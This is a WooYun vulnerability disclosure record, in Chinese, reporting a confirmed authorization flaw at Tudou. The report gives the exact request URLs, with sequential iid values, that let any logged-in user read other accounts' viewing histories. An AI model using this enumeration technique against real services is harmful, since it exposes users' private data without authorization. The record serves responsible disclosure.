{"id": 9977, "wybug_id": "wooyun-2015-0121516", "wybug_title": "土豆网可越权查看所有账号观影记录", "wybug_corp": "土豆网", "wybug_author": "jeary", "wybug_date": "2015-06-19 08:55", "wybug_open_date": "2015-08-03 10:58", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口未加权限认证", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向公众公开  简要描述： 刚开始以为不是别人的观影记录，后来我登陆了三个不同的账号，确认是越权。 详细说明：  \n\n首先正常查看自己的观影记录，然后记录那个请求观影记录的请求~请求如下：\nhttp://www.tudou.com/viewrecord/info/merge.html?&app=watchcenter&info={\"start\":0,\"rows\":50,\"needDetail\":true,\"viewRecords\":[{\"iid\":132457734,\"aid\":246636,\"acode\":\"\",\"device\":0,\"viewrecordType\":2,\"lid\":-3,\"ct\":1434639620658,\"done\":0,\"lvt\":27.556}],\"selectType\":0}\n然后打开另外一个浏览器，登陆一个新的没有观影记录的账号，访问上面那个链接\n\n看到帐号一的观影记录。经测试发现遍历iid即可得到所有人的观影记录~   漏洞证明：  \nhttp://www.tudou.com/viewrecord/info/merge.html?&app=watchcenter&info={\"start\":0,\"rows\":50,\"needDetail\":true,\"viewRecords\":[{\"iid\":132457234,\"aid\":246631,\"acode\":\"\",\"device\":0,\"viewrecordType\":2,\"lid\":-3,\"ct\":1434639620658,\"done\":0,\"lvt\":27.556}],\"selectType\":0}\n\nhttp://www.tudou.com/viewrecord/info/merge.html?&app=watchcenter&info={\"start\":0,\"rows\":50,\"needDetail\":true,\"viewRecords\":[{\"iid\":132457235,\"aid\":246631,\"acode\":\"\",\"device\":0,\"viewrecordType\":2,\"lid\":-3,\"ct\":1434639620658,\"done\":0,\"lvt\":27.556}],\"selectType\":0}\n\nhttp://www.tudou.com/viewrecord/info/merge.html?&app=watchcenter&info={\"start\":0,\"rows\":50,\"needDetail\":true,\"viewRecords\":[{\"iid\":132457236,\"aid\":246631,\"acode\":\"\",\"device\":0,\"viewrecordType\":2,\"lid\":-3,\"ct\":1434639620658,\"done\":0,\"lvt\":27.556}],\"selectType\":0}\n...   修复方案：     版权声明：转载请注明来源 jeary@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-06-19 10:57 厂商回复： 确认，多谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-05 00:08 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 逆流而上，顺势而为)\t\t \n  刚开始以为不是别人的观影记录，后来我登陆了三个不同的账号，确认是越权。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}